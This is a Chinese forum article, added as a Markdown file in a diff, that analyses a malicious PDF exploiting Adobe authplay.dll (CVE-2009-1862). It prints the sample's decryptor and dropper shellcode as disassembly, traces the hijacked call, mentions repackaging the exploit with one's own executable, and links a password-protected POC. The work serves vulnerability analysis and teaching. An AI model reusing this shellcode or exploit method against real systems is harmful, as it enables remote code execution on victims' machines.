@@ -1,0 +1,362 @@
+
+# Adobe flash 漏洞之 CVE-2009-1862 初探 --基础知识篇
+
+> 原文：[`www.pediy.com/kssd/pediy10/101342.html`](https://www.pediy.com/kssd/pediy10/101342.html)
+
+最近一直比较忙，在论坛上看到 NNpig 兄弟发 exploit 已经有一周多了，今天早上才抽出点时间跟了一下，大体的了解了原理。里面也有好多问题没有空来深入研究了，先发出来供大家参考，或者哪个兄弟想详细探讨或者有什么疑问可以联系我共同研究。
+
+下面从拿到一个 POC 或者 exploit 如何来进一步的研究漏洞原理的过程进行一个探讨，仅为个人习惯供参考。
+
+## 1.依据文件格式，定位 shellcode
+
+一般情况下我们能拿到的可能就是 poc 或者一个捆绑了 exe 的 exploit 文件，如果想仔细分析下这个漏洞的原理或者想自己写一个生成器该如何下手呢？
+
+当然作为后者来讲，就比较简单了一般情况下 exploit 文件里面的 shellcode 都是现成的，只需要自己定位出 shellcode，分析一下 shellcode 运行的逻辑，就可以构造一个捆绑自己 exe 的 exploit 文件出来，当然这个时候写生成器已经是举手之劳了。这里我就不讨论这个套路了。
+
+对于分析漏洞原理这里来讲前面说的就只能作为第一步了，下面我就讲讲我的定位 exploit 的 shellcode 位置的方法：
+
+### （1）观察：
+
+一般有经验的样本分析者，可能利用 `ue` 等简单的 16 进制文本编辑器就可以用肉眼很快的定位出来 shellcode 的位置，当然，这个需要有丰富的经验，包括对文件二进制格式的研究等各个方面了。
+
+因为这个是 PDF 的文件，前面我有文章讲解了下 pdf 文件的基本结构，通过基本的文件结构我们就可以看出来，这个 pdf 文件一共有 20 个 OBJ，当然数据量比较大也最引人注目的就是第 8 个 OBJ 了，它是一个 swf 对象，即 flash 对象，那么基本上立刻就可以联想到今年 7 月份的 Adobe flashplayer 那个漏洞了，展示下漏洞公告：
+
+引用: Adobe：Flash Player 等软件出现高危漏洞
+
+2009-07-24 09:15
+
+Adobe 今日警告广大用户，当前版本的 Flash Player（9.0 和 10.0 版本）和 Adobe Reader/Acrobat 9.x 的 `authplay.dll` 中存在一个危急的安全漏洞（CVE-2009-1862），Flash 中的该漏洞影响 Windows、Mac 和 Linux 系统用户，Adobe Reader/Acrobat 中的该漏洞影响 Windows、Mac 和 Unix 用户。
+
+此次发现的这一高危漏洞会导致系统崩溃，也有可能会被黑客利用进行远程代码攻击，目前已经有报道称 Windows 上的 Adobe Reader 9 受到该漏洞的攻击，Adobe 表示正在开发补丁解决这个问题。
+
+在 Adobe Reader/Acrobat 9.x 中删除、重命名或迁移 `authplay.dll` 文件可以减轻受攻击的可能，不过这样做会致使打开包含 SWF 内容的 PDF 文件时出现崩溃或错误信息的几率增大。
+
+根据产品的不同 `authplay.dll` 文件的位置也不同，Windows 系统 Adobe Reader/Acrobat 9.x 中其位置通常为 `C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\authplay.dll` 和 `C:\\Program Files\\Adobe\\Acrobat 9.0\\Acrobat\\authplay.dll`，建议 Windows Vista 用户可以考虑开启 UAC 降低受攻击的风险；Flash Player 用户在打开网站时应当小心谨慎。
+
+从数据的本身规律来看如图：
+
+![](img/3a4083968ed1ca78685d2dafdf9f69c0.jpg)
+
+这个 obj 里面分的数据为四个部分，第一部分就是 `FWS` 的 flash 文件头；第二部分是一些杂乱的数据；第三部分，就是很有规律的从 1-z 的数据；
+
+![](img/822b6cfc92fa29e9f9476c75905f8778.jpg)
+
+另外一个部分就是很扎眼的 `AAAAAAAA`....；
+
+![](img/f9a2e82e7d9d243b6b7fd6f5956a7166.jpg)
+
+很有规律的数据我们可以略过，shellcode 基本不会是这样的；`AAAAAAAAA`....可能是填充数据用，那么最有可能的就是第二部分那些杂乱的数据了，用 `C32ASM` 的话可以从 处开始反汇编看看代码很幸运的是我们在 处找到了如下代码：
+
+```
+00000F59:  33C9                       XOR     ECX,ECX
+00000F5B:  66:B9 5901                 MOV     CX,159
+00000F5F:  83C2 17                    ADD     EDX,17
+00000F62:  8BFA                       MOV     EDI,EDX
+00000F64:  8BF7                       MOV     ESI,EDI
+00000F66:  56                         PUSH    ESI
+00000F67:  AC                         LODS    BYTE PTR [ESI]
+00000F68:  C0C0 04                    ROL     AL,4
+00000F6B:  AA                         STOS    BYTE PTR ES:[EDI]
+00000F6C:  49                         DEC     ECX
+00000F6D:  75 F8                      JNZ     SHORT 00000F67
+00000F6F:  C3                         RETN
+00000F70:  55                         PUSH    EBP
+00000F71:  B8 CE38CEC5                MOV     EAX,C5CE38CE
+00000F76:  35 65757C54                XOR     EAX,547C7565
+00000F7B:  0F11                       ???
+00000F7D:  0000                       ADD     [EAX],AL
+00000F7F:  009E 5E000000              ADD     [ESI+5E],BL
+00000F85:  F8                         CLC
+00000F86:  54                         PUSH    ESP
+00000F87:  CF                         IRETD
+00000F88:  46                         INC     ESI
+00000F89:  1A03                       SBB     AL,[EBX]
+00000F8B:  0000                       ADD     [EAX],AL
+00000F8D:  00B8 04C0B807              ADD     [EAX+7B8C004],BH
+00000F93:  C1DA B8                    RCR     EDX,B8
+00000F96:  8580 98D5CEB8              TEST    [EAX+B8CED598],EAX
+00000F9C:  D4 0F                      AAM     F
+```
+
+出现了 `XOR ECX,ECX` 和惊人的 `RETN` 基本上可以判断这里是 shellcode 的前半部分，负责对后半部分进行解密。
+
+### （2）验证：
+
+既然通过上面的观察基本上可以知道这里是 shellcode，我们还需要进一步的进行验证。这里主要以 `OD` 为调试器进行讲解：
+
+当然，如果你有 `SoftICE` 的话可以在这里填入 `CCCC`，然后，在对应环境下打开 exploit 文件，就弹出窗口了。不过千万不要在非调试器环境下这样试，因为 `INT 3` 会让你的系统挂起，那样就不太好办了，只能重启了。
+
+用 `OD` 来验证也是同样的道理，给 shellcode 造成一个异常，然后 `OD` 就会断到那里，不过这个是要在你刚才找到的点是正确的前提下。
+
+断在了 shellcode 的入口处，那么我们就可以把刚才改的异常的地方改回原样，然后就可以完整的看到 shellcode 是如何运行的，也可以清楚的看到 shellcode 的真面目了：
+
+代码:
+
+
+
+```
+06A50000    33C9            XOR ECX,ECX
+06A50002    B9 BFA20300     MOV ECX,3A2BF
+06A50007    8B75 F8         MOV ESI,DWORD PTR SS:\[EBP-8\]
+06A5000A    83C6 19         ADD ESI,19
+06A5000D    56              PUSH ESI
+06A5000E    8A06            MOV AL,BYTE PTR DS:\[ESI\]
+06A50010    32C1            XOR AL,CL
+06A50012    8806            MOV BYTE PTR DS:\[ESI\],AL
+06A50014    46              INC ESI
+06A50015    49              DEC ECX
+06A50016  ^ 75 F6           JNE SHORT 06A5000E
+06A50018    C3              RETN
+06A50019    55              PUSH EBP
+06A5001A    8BEC            MOV EBP,ESP
+06A5001C    81EC AC020000   SUB ESP,2AC
+06A50022    53              PUSH EBX
+06A50023    56              PUSH ESI
+06A50024    57              PUSH EDI
+06A50025    8D85 F0FEFFFF   LEA EAX,\[EBP-110\]
+06A5002B    50              PUSH EAX
+06A5002C    68 04010000     PUSH 104
+06A50031    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A50034    FF51 20         CALL DWORD PTR DS:\[ECX+20\]
+06A50037    8D95 ECFDFFFF   LEA EDX,\[EBP-214\]
+06A5003D    52              PUSH EDX
+06A5003E    6A 00           PUSH 0
+06A50040    6A 00           PUSH 0
+06A50042    8D85 F0FEFFFF   LEA EAX,\[EBP-110\]
+06A50048    50              PUSH EAX
+06A50049    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A5004C    FF51 1C         CALL DWORD PTR DS:\[ECX+1C\]
+06A5004F    6A 00           PUSH 0
+06A50051    68 80000000     PUSH 80
+06A50056    6A 02           PUSH 2
+06A50058    6A 00           PUSH 0
+06A5005A    6A 00           PUSH 0
+06A5005C    68 000000C0     PUSH C0000000
+06A50061    8D95 ECFDFFFF   LEA EDX,\[EBP-214\]
+06A50067    52              PUSH EDX
+06A50068    8B45 0C         MOV EAX,DWORD PTR SS:\[EBP+0C\]
+06A5006B    FF50 04         CALL DWORD PTR DS:\[EAX+4\]
+06A5006E    8945 F4         MOV DWORD PTR SS:\[EBP-0C\],EAX
+06A50071    C785 E8FDFFFF 0 MOV DWORD PTR SS:\[EBP-218\],0
+06A5007B    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A5007E    8B51 4C         MOV EDX,DWORD PTR DS:\[ECX+4C\]
+06A50081    8955 F8         MOV DWORD PTR SS:\[EBP-8\],EDX
+06A50084    2B75 F8         SUB ESI,DWORD PTR SS:\[EBP-8\]
+06A50087    8B45 0C         MOV EAX,DWORD PTR SS:\[EBP+0C\]
+06A5008A    8B48 48         MOV ECX,DWORD PTR DS:\[EAX+48\]
+06A5008D    894D F8         MOV DWORD PTR SS:\[EBP-8\],ECX
+06A50090    2B75 F8         SUB ESI,DWORD PTR SS:\[EBP-8\]
+06A50093    8975 FC         MOV DWORD PTR SS:\[EBP-4\],ESI
+06A50096    6A 00           PUSH 0
+06A50098    8D95 E8FDFFFF   LEA EDX,\[EBP-218\]
+06A5009E    52              PUSH EDX
+06A5009F    8B45 F8         MOV EAX,DWORD PTR SS:\[EBP-8\]
+06A500A2    50              PUSH EAX
+06A500A3    8B4D FC         MOV ECX,DWORD PTR SS:\[EBP-4\]
+06A500A6    51              PUSH ECX
+06A500A7    8B55 F4         MOV EDX,DWORD PTR SS:\[EBP-0C\]
+06A500AA    52              PUSH EDX
+06A500AB    8B45 0C         MOV EAX,DWORD PTR SS:\[EBP+0C\]
+06A500AE    FF50 40         CALL DWORD PTR DS:\[EAX+40\]
+06A500B1    8B4D FC         MOV ECX,DWORD PTR SS:\[EBP-4\]
+06A500B4    034D F8         ADD ECX,DWORD PTR SS:\[EBP-8\]
+06A500B7    894D FC         MOV DWORD PTR SS:\[EBP-4\],ECX
+06A500BA    8B55 F4         MOV EDX,DWORD PTR SS:\[EBP-0C\]
+06A500BD    52              PUSH EDX
+06A500BE    8B45 0C         MOV EAX,DWORD PTR SS:\[EBP+0C\]
+06A500C1    FF10            CALL DWORD PTR DS:\[EAX\]
+06A500C3    6A 05           PUSH 5
+06A500C5    8D8D ECFDFFFF   LEA ECX,\[EBP-214\]
+06A500CB    51              PUSH ECX
+06A500CC    8B55 0C         MOV EDX,DWORD PTR SS:\[EBP+0C\]
+06A500CF    FF52 3C         CALL DWORD PTR DS:\[EDX+3C\]
+06A500D2    8B45 0C         MOV EAX,DWORD PTR SS:\[EBP+0C\]
+06A500D5    83C0 54         ADD EAX,54
+06A500D8    8945 F8         MOV DWORD PTR SS:\[EBP-8\],EAX
+06A500DB    8B75 F8         MOV ESI,DWORD PTR SS:\[EBP-8\]
+06A500DE    8DBD F0FEFFFF   LEA EDI,\[EBP-110\]
+06A500E4    47              INC EDI
+06A500E5    803F 00         CMP BYTE PTR DS:\[EDI\],0
+06A500E8  ^ 75 FA           JNE SHORT 06A500E4
+06A500EA    AC              LODS BYTE PTR DS:\[ESI\]
+06A500EB    AA              STOS BYTE PTR ES:\[EDI\]
+06A500EC    3C 00           CMP AL,0
+06A500EE  ^ 75 FA           JNE SHORT 06A500EA
+06A500F0    6A 00           PUSH 0
+06A500F2    68 80000000     PUSH 80
+06A500F7    6A 02           PUSH 2
+06A500F9    6A 00           PUSH 0
+06A500FB    6A 00           PUSH 0
+06A500FD    68 000000C0     PUSH C0000000
+06A50102    8D8D F0FEFFFF   LEA ECX,\[EBP-110\]
+06A50108    51              PUSH ECX
+06A50109    8B55 0C         MOV EDX,DWORD PTR SS:\[EBP+0C\]
+06A5010C    FF52 04         CALL DWORD PTR DS:\[EDX+4\]
+06A5010F    8945 F4         MOV DWORD PTR SS:\[EBP-0C\],EAX
+06A50112    C785 E8FDFFFF 0 MOV DWORD PTR SS:\[EBP-218\],0
+06A5011C    6A 00           PUSH 0
+06A5011E    8D85 E8FDFFFF   LEA EAX,\[EBP-218\]
+06A50124    50              PUSH EAX
+06A50125    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A50128    8B51 4C         MOV EDX,DWORD PTR DS:\[ECX+4C\]
+06A5012B    52              PUSH EDX
+06A5012C    8B45 FC         MOV EAX,DWORD PTR SS:\[EBP-4\]
+06A5012F    50              PUSH EAX
+06A50130    8B4D F4         MOV ECX,DWORD PTR SS:\[EBP-0C\]
+06A50133    51              PUSH ECX
+06A50134    8B55 0C         MOV EDX,DWORD PTR SS:\[EBP+0C\]
+06A50137    FF52 40         CALL DWORD PTR DS:\[EDX+40\]
+06A5013A    8B45 F4         MOV EAX,DWORD PTR SS:\[EBP-0C\]
+06A5013D    50              PUSH EAX
+06A5013E    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A50141    FF11            CALL DWORD PTR DS:\[ECX\]
+06A50143    68 04010000     PUSH 104
+06A50148    8D95 ECFDFFFF   LEA EDX,\[EBP-214\]
+06A5014E    52              PUSH EDX
+06A5014F    6A 00           PUSH 0
+06A50151    8B45 0C         MOV EAX,DWORD PTR SS:\[EBP+0C\]
+06A50154    FF50 18         CALL DWORD PTR DS:\[EAX+18\]
+06A50157    8DB5 F0FEFFFF   LEA ESI,\[EBP-110\]
+06A5015D    8DBD ECFDFFFF   LEA EDI,\[EBP-214\]
+06A50163    47              INC EDI
+06A50164    803F 00         CMP BYTE PTR DS:\[EDI\],0
+06A50167  ^ 75 FA           JNE SHORT 06A50163
+06A50169    C607 20         MOV BYTE PTR DS:\[EDI\],20
+06A5016C    47              INC EDI
+06A5016D    C607 22         MOV BYTE PTR DS:\[EDI\],22
+06A50170    47              INC EDI
+06A50171    AC              LODS BYTE PTR DS:\[ESI\]
+06A50172    AA              STOS BYTE PTR ES:\[EDI\]
+06A50173    3C 00           CMP AL,0
+06A50175  ^ 75 FA           JNE SHORT 06A50171
+06A50177    4F              DEC EDI
+06A50178    C607 22         MOV BYTE PTR DS:\[EDI\],22
+06A5017B    47              INC EDI
+06A5017C    C607 00         MOV BYTE PTR DS:\[EDI\],0
+06A5017F    8DBD A4FDFFFF   LEA EDI,\[EBP-25C\]
+06A50185    33C0            XOR EAX,EAX
+06A50187    B9 11000000     MOV ECX,11
+06A5018C    F2:AB           REPNE STOS DWORD PTR ES:\[EDI\]
+06A5018E    8D8D 94FDFFFF   LEA ECX,\[EBP-26C\]
+06A50194    51              PUSH ECX
+06A50195    8D95 A4FDFFFF   LEA EDX,\[EBP-25C\]
+06A5019B    52              PUSH EDX
+06A5019C    6A 00           PUSH 0
+06A5019E    6A 00           PUSH 0
+06A501A0    6A 00           PUSH 0
+06A501A2    6A 00           PUSH 0
+06A501A4    6A 00           PUSH 0
+06A501A6    6A 00           PUSH 0
+06A501A8    8D85 ECFDFFFF   LEA EAX,\[EBP-214\]
+06A501AE    50              PUSH EAX
+06A501AF    6A 00           PUSH 0
+06A501B1    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A501B4    FF51 08         CALL DWORD PTR DS:\[ECX+8\]
+06A501B7    8B55 0C         MOV EDX,DWORD PTR SS:\[EBP+0C\]
+06A501BA    FF52 10         CALL DWORD PTR DS:\[EDX+10\]
+06A501BD    8945 F4         MOV DWORD PTR SS:\[EBP-0C\],EAX
+06A501C0    6A 00           PUSH 0
+06A501C2    8B45 F4         MOV EAX,DWORD PTR SS:\[EBP-0C\]
+06A501C5    50              PUSH EAX
+06A501C6    8B4D 0C         MOV ECX,DWORD PTR SS:\[EBP+0C\]
+06A501C9    FF51 34         CALL DWORD PTR DS:\[ECX+34\]
+```
+
+## 2.跟踪问题函数
+
+虽然根据上面第一步的介绍，我们可以清楚的看到 shellcode 以及了解其原理，但是如果要搞明白漏洞的原理还是需要进一步进行分析的，因为 shellcode 的运行是建立在漏洞已经触发的基础上的，所以我们需要继续向上追寻：
+
+（1）堆栈查找返回地址
+
+
+
+一般情况下 `shellcode` 被调用的方式要么是被 `CALL`，要么是 `JMP`，而且发生溢出时很有可能问题函数的返回地址可能就在栈里面，这样我们在 `shellcode` 头处制造异常后，就可以在堆栈中追寻线索，从上面我们就可以清楚的看到一个回调地址
+
+代码:
+```
+CPU 堆栈
+地址      数值       ASCII 注释
+0012E290  302092AF  0   ; 返回《== 从 authplay.301E0ED1 到 authplay.302092AF
+```
+
+哈哈，是从 `authplay` 模块中调用的，跟到那里下断点可以看到：
+
+代码:
+```
+CPU Disasm
+地址      十六进制          命令                     注释
+301E0ED1    55              PUSH EBP
+301E0ED2    8BEC            MOV EBP,ESP
+301E0ED4    51              PUSH ECX
+301E0ED5    51              PUSH ECX
+。。。。。。
+
+301E105C    7E 08           JLE SHORT 301E1066
+301E105E    8B45 08         MOV EAX,DWORD PTR SS:[EBP+8]
+301E1061    8B40 08         MOV EAX,DWORD PTR DS:[EAX+8]
+301E1064    EB 05           JMP SHORT 301E106B
+301E1066    8B45 0C         MOV EAX,DWORD PTR SS:[EBP+0C]
+301E1069    8B00            MOV EAX,DWORD PTR DS:[EAX]
+301E106B    83E0 F8         AND EAX,FFFFFFF8
+301E106E    8BD8            MOV EBX,EAX
+301E1070    8BF3            MOV ESI,EBX
+301E1072    8B06            MOV EAX,DWORD PTR DS:[ESI]
+301E1074    57              PUSH EDI
+301E1075    8BCE            MOV ECX,ESI
+301E1077    FF50 48         CALL DWORD PTR DS:[EAX+48]  --------------------溢出跳转
+301E107A    84C0            TEST AL,AL
+301E107C    75 1B           JNE SHORT 301E1099
+301E107E    8B76 14         MOV ESI,DWORD PTR DS:[ESI+14]
+301E1081    85F6            TEST ESI,ESI
+301E1083  ^ 75 ED           JNE SHORT 301E1072
+301E1085    807D 18 00      CMP BYTE PTR SS:[EBP+18],0
+301E1089    74 0E           JE SHORT 301E1099
+301E108B    8B4D FC         MOV ECX,DWORD PTR SS:[EBP-4]
+301E108E    57              PUSH EDI
+301E108F    68 29040000     PUSH 429
+301E1094    E8 71B2FEFF     CALL 301CC30A
+301E1099    8BC3            MOV EAX,EBX
+301E109B    83C8 01         OR EAX,00000001
+301E109E    5B              POP EBX
+301E109F    5F              POP EDI
+301E10A0    5E              POP ESI
+301E10A1    C9              LEAVE
+301E10A2    C2 1800         RETN 18
+```
+
+这样继续再追寻原理就很容易了
+
+## （2）正面查找
+
+上面这种方法对于比较简单的溢出可能能找到，但是有些溢出可能堆栈已经完全被覆盖了找不到返回地址的影子了，那怎么办呢，只能通过一种比较原始，而有累的方法了：
+
+通过对 `shellcode` 的分析，我们可以了解 `shellcode` 中应用了哪些 `API` 函数，这种方法就是我们在系统的 `API` 函数上下断点，然后从 `Adobe.EXE` 开始加载 `exploit` 的时候就一步一步寻找哪个 `call` 可以导致直接运行到 `shellcode`，这样的方法就需要记录一个 `call` 的串，比如 `CALL A` ---> `CALL B` ---> `CALL ...` ---> `CALL Z` ---> `shellcode` 这个过程是一个相当繁琐的过程，需要对每个 `call` 进行测试，所以也要很对 `exploit` 文件进行反复加载反复调试来最终得到结果。
+
+## 3. 分析溢出原理
+
+根据上面的步骤，我们得到了那个关键 `CALL`
+
+代码:
+```
+301E1066    8B45 0C         MOV EAX,DWORD PTR SS:[EBP+0C]
+301E1069    8B00            MOV EAX,DWORD PTR DS:[EAX]
+301E106B    83E0 F8         AND EAX,FFFFFFF8
+301E106E    8BD8            MOV EBX,EAX
+301E1070    8BF3            MOV ESI,EBX
+301E1072    8B06            MOV EAX,DWORD PTR DS:[ESI]
+301E1074    57              PUSH EDI
+301E1075    8BCE            MOV ECX,ESI
+301E1077    FF50 48         CALL DWORD PTR DS:[EAX+48]
+```
+
+基本的原理就可以得知，是因为这个 `call [EAX+48H]` 引起的。因为 `EAX+48H` 就是 `ODODODOD`，`[ODODODOD]` 也被填充成了 `ODODODOD` 这样经过漫长的跳转就可以跳转到 `shellcode` 上达成漏洞的利用了，至于如何再进一步了解是哪个函数，因为哪个参数的原因引起的这个漏洞，我们就需要利用 `IDA` 等工具对 `authplay.dll` 文件的相关函数进行分析了，这里我就不讲了，因为涉及的东西比较多，有兴趣的可以自己分析分析。
+
+## 4. 结束语
+
+写这篇文章的主要目的不是为了针对这个漏洞来进行详细的阐述的，而是提供给大家一种基本的 `exploit` 文件分析方法，以起到抛砖引玉的作用。本人水平有限，文章中错误之处希望大家多多批评指正，也欢迎大家多交流。
+
+楼主给了个 `POC` 样本，发给大家，共同进步哈！
+
+上传的附件
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `poc.rar` 解压密码: `PEDIY` |
